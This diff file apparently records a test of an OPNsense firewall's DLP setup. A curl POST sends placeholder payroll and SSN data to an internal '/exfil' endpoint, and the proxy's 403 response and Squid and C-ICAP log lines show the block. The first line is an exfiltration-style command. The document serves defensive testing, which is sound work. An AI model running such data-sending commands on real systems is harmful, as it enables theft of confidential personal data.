@@ -1,0 +1,17 @@
+##PS C:\> curl.exe -i -X POST http://10.0.2.25/exfil -d "CONFIDENTIAL_PAYROLL: EmployeeID=10492, SSN=000-11-2222, Salary=95000"
+
+HTTP/1.1 403 Forbidden
+Server: C-ICAP
+Content-Type: text/html
+Content-Language: en
+Date: Wed, 07 Oct 2026 21:16:30 GMT
+Cache-Status: OPNsense.internal
+Transfer-Encoding: chunked
+Connection: keep-alive
+
+##[root@OPNsense /var/log/squid]# grep "exfil" access.log | tail -n 1
+1791407790.047      4 192.168.10.50 NONE_NONE/403 8154 POST http://10.0.2.25/exfil - HIER_NONE/- text/html
+
+##[root@OPNsense /var/log/cicap]# grep "VIRUS DETECTED: DLP.Outbound.RestrictedPII.UNOFFICIAL" latest.log | tail -n 1
+
+<26>1 2026-10-07T21:16:30+00:00 OPNsense.internal c-icap 30963 - [meta sequenceId="454"] 30963/27085909706768, VIRUS DETECTED: DLP.Outbound.RestrictedPII.UNOFFICIAL , http client ip: 192.168.10.50, http user: -, http url: http://10.0.2.25/exfil
